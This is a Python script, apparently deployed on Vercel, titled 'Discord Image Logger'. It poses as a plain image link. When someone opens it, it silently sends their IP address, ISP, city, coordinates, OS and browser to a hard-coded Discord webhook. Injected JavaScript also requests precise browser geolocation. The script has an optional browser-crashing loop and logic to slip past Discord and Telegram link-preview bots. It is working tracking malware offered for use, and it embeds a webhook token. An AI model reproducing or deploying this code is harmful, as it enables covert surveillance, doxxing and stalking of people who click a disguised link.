from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import json

__app__ = "Discord Image Logger"
__description__ = "a simple image logger"
__version__ = "v2.0"
__author__ = "foaqen"

config = {
    "webhook": "https://discord.com/api/webhooks/1467553434541625558/fKl1f66ykkbYUxlzxhR-ODuDaskO6bZvEi_Xb7zxeR0MNelnYg3LJBs-ZFCmA2QYDmbK",
    "image": "https://pngimg.com/uploads/spongebob/spongebob_PNG10.png", 
    "imageArgument": True,

    "username": "Logger Agent", 
    "color": 0x00FFFF,

    "crashBrowser": False, 
    "accurateLocation": True,

    "message": {
        "doMessage": False, 
        "message": "A new person clicked.",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": False, 
    "buggedImage": True,
    "antiBot": 1,

    "redirect": {
        "redirect": False,
        "page": "https://example.org"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error!",
                    "color": config["color"],
                    "description": f"An error occurred while logging the IP address!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip:
        ip = "Unknown"
    
    if ip != "Unknown" and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"IPLogger link was sent to a chat!\nYou will be notified when someone clicks.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except:
                pass
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {
            "isp": "Unknown",
            "as": "Unknown",
            "country": "Unknown",
            "regionName": "Unknown",
            "city": "Unknown",
            "lat": 0,
            "lon": 0,
            "timezone": "Unknown/Unknown",
            "mobile": False,
            "proxy": False,
            "hosting": False
        }
    
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if info.get("proxy"):
                pass
            else:
                return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2:
            if info.get("proxy"):
                pass
            else:
                ping = ""
        if config["antiBot"] == 1:
            ping = ""

    os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - Someone Clicked!",
                "color": config["color"],
                "description": f"""**A user opened the original image**

**Endpoint:** `{endpoint}`
                
**IP Address:**
> **IP:** `{ip}`
> **ISP:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coordinates:** `{str(info.get('lat', 0)) + ', ' + str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**Computer Information:**
> **Operating System:** `{os}`
> **Browser:** `{browser}`

**Agent:**
{useragent if useragent else 'Unknown'}

""",
            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    
    return info

# Vercel serverless function handler
def handler(request):
    try:
        # Get IP address from Vercel headers
        ip = (request.headers.get('x-forwarded-for') or 
              request.headers.get('x-real-ip') or 
              'Unknown')
        
        # Get user agent
        useragent = request.headers.get('user-agent', 'Unknown')
        
        # Parse query parameters
        parsed_url = parse.urlparse(request.url)
        query_params = dict(parse.parse_qsl(parsed_url.query))
        
        # Get image URL
        if config["imageArgument"]:
            if query_params.get("url") or query_params.get("id"):
                try:
                    url = base64.b64decode(query_params.get("url") or query_params.get("id").encode()).decode()
                except:
                    url = config["image"]
            else:
                url = config["image"]
        else:
            url = config["image"]
        
        # Check if blacklisted
        if ip and ip != "Unknown" and ip.startswith(blacklistedIPs):
            return create_response(200, "OK")
        
        # Handle bot detection
        if botCheck(ip, useragent):
            makeReport(ip, endpoint=parsed_url.path, url=url)
            
            if config["buggedImage"]:
                # Return a 1x1 pixel GIF for bugged image
                return create_response(200, "OK", {
                    "Content-Type": "image/gif"
                }, base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"))
            else:
                return create_response(302, "Redirect", {
                    "Location": url
                })
        
        # Handle accurate location
        if query_params.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query_params.get("g").encode()).decode()
                result = makeReport(ip, useragent, location, parsed_url.path, url=url)
            except:
                result = makeReport(ip, useragent, endpoint=parsed_url.path, url=url)
        else:
            result = makeReport(ip, useragent, endpoint=parsed_url.path, url=url)
        
        # Build response HTML
        message = config["message"]["message"]
        
        if config["message"]["richMessage"] and result and isinstance(result, dict):
            message = message.replace("{ip}", ip)
            message = message.replace("{isp}", str(result.get("isp", "Unknown")))
            message = message.replace("{asn}", str(result.get("as", "Unknown")))
            message = message.replace("{country}", str(result.get("country", "Unknown")))
            message = message.replace("{region}", str(result.get("regionName", "Unknown")))
            message = message.replace("{city}", str(result.get("city", "Unknown")))
            message = message.replace("{lat}", str(result.get("lat", "0")))
            message = message.replace("{long}", str(result.get("lon", "0")))
            
            timezone = result.get("timezone", "Unknown/Unknown")
            if '/' in timezone:
                message = message.replace("{timezone}", f"{timezone.split('/')[1].replace('_', ' ')} ({timezone.split('/')[0]})")
            else:
                message = message.replace("{timezone}", "Unknown")
            
            message = message.replace("{mobile}", str(result.get("mobile", False)))
            message = message.replace("{vpn}", str(result.get("proxy", False)))
            message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
            
            os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
            message = message.replace("{browser}", browser)
            message = message.replace("{os}", os)
        
        # Build HTML content
        if config["message"]["doMessage"]:
            html_content = message
        else:
            html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''
        
        if config["crashBrowser"]:
            html_content += '<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
        
        if config["redirect"]["redirect"]:
            html_content = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'
        
        if config["accurateLocation"]:
            html_content += """<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}
</script>"""
        
        return create_response(200, html_content, {"Content-Type": "text/html"})
    
    except Exception as e:
        reportError(traceback.format_exc())
        return create_response(500, "Internal Server Error")

def create_response(status_code, body, headers=None, binary_body=None):
    """Helper function to create a response for Vercel"""
    response = {
        "statusCode": status_code,
        "headers": headers or {"Content-Type": "text/plain"}
    }
    
    if binary_body:
        response["body"] = base64.b64encode(binary_body).decode("utf-8")
        response["isBase64Encoded"] = True
    else:
        response["body"] = body
    
    return response

# This is the entry point for Vercel
def main(request):
    return handler(request)
